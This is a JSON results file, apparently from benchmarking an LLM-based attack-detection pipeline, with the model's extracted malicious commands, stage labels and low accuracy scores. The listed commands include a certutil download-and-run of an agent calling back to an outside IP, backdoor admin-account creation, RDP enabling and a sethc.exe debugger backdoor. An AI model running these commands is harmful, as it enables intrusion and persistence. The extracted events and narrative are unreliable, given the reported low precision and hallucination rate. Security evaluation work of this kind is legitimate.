@@ -1,0 +1,84 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&net user oop o33 /add&echo [S]\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&certutil.exe -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /c \"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389;",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c \"cd /d D:/phpStudy/WWW/&tasklist /svc | findstr TermService&echo [S]\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C 'reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389;reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\";REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\\\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c 'cmd /c \"cd /d \"D:/phpStudy/WWW\"&ywm.exe&echo [S]\"'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c 'winbrute.exe administrator_pass.txt administrator'",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The investigation indicates a sophisticated multi-stage attack starting with initial access via downloading and executing remote payloads over HTTP. The attackers then established persistence using registry manipulation and service modifications, escalated their privileges, discovered internal assets, and performed credential theft.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 26321,
+      "completion_tokens": 3262,
+      "total_tokens": 29583,
+      "wall_clock_s": 36.976,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.3333333333333333,
+      "f1": 0.28571428571428575,
+      "tp": 2,
+      "fp": 6,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.25,
+      "recall": 0.3333333333333333,
+      "f1": 0.28571428571428575,
+      "tp": 2,
+      "fp": 6,
+      "fn": 4,
+      "recall_partial": 0.3333333333333333
+    },
+    "hallucination_rate": 0.1,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 26321,
+      "completion_tokens": 3262,
+      "total_tokens": 29583,
+      "wall_clock_s": 36.976,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
